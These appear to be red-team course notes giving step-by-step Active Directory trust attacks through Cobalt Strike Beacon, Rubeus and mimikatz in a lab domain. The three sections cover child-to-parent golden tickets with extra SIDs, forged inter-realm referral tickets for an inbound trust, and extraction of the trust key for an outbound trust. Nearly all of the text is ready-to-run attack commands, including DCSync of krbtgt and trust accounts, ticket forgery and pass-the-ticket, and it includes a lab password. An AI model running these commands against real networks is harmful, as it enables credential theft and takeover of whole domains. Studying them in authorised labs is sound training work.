
### Child to Parent Abuse

- Enumerate the type of trust in place.
    
    BeaconTypeCopy
    
    `ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName`
    
-  Obtain the AES256 hash for the child domain's krbtgt account.
    
    1. dcsync dublin.contoso.com DUBLIN\krbtgt
-  Obtain the domain SID for _dublin.contoso.com_.
    
    1. ldapsearch (objectClass=domain) --attributes objectSid
-  Obtain the domain SID for _contoso.com_.
    
    1. ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
-  On the Attacker Desktop, forge a golden ticket and output to a file.
    
    TerminalTypeCopy
    
    `C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:[DUBLIN SID] /sids:[CONTOSO EA GROUP SID] /aes256:[DUBLIN KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden`
    
-  Inject the ticket into Beacon.
    
    BeaconTypeCopy
    
    `kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]`
    
-  Verify the ticket is in the session.
    
    1.  run klist
-  Access the parent domain's domain controller.
    
    1. ls \\lon-dc-1\c$

### Inbound Trust 
- Enumerate the one-way trust.
    
    BeaconTypeCopy
    
    `ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname`
    
-  Enumerate the Foreign Security Principals Container.
    
    BeaconTypeCopy
    
    `ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com`
    
-  Identify an interesting SID.
    
    1. ldapsearch (objectSid=[SID])
-  DCSync the shared inter-realm key.
    
    1. make_token CONTOSO\dyork Passw0rd!
    2. dcsync contoso.com CONTOSO\PARTNER$
    3. rev2self
-  On the Attacker Desktop, forge a referral ticket.
    
    TerminalTypeCopy
    
    `C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:[NTLM HASH] /nowrap`
    
-  Use the forged ticket to request service tickets for the trusting domain.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[TICKET] /nowrap`
    
-  Inject the service ticket into the current logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]`
    
-  Verify the ticket was injected.
    
    1. run klist
-  Access the service in the trusting domain.
    
    1. ls \\par-jmp-1.partner.com\c$


### Outbound Trust
1.  Enumerate the one-way trust.
    
    BeaconTypeCopy
    
    `ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName`
    
2.  On the medium integrity Beacon, get the GUID of the TDO.
    
    BeaconTypeCopy
    
    `ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID`
    
3.  Obtain the shared inter-realm key from the TDO.
    
    1. mimikatz lsadump::dcsync /domain:partner.com /guid:{[GUID]}
4.  Request a TGT for the trust account using the shared secret.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:[RC4 HASH] /nowrap`
    
5.  On the high integrity Beacon, inject the TGT into a sacrifial logon session.
    
    1. make_token CONTOSO\PARTNER$ FakePass
    2. execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]
6.  Verify the ticket has been injected.
    
    1. run klist
7.  Enumerate the trusted domain.
    
    BeaconTypeCopy
    
    `ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com`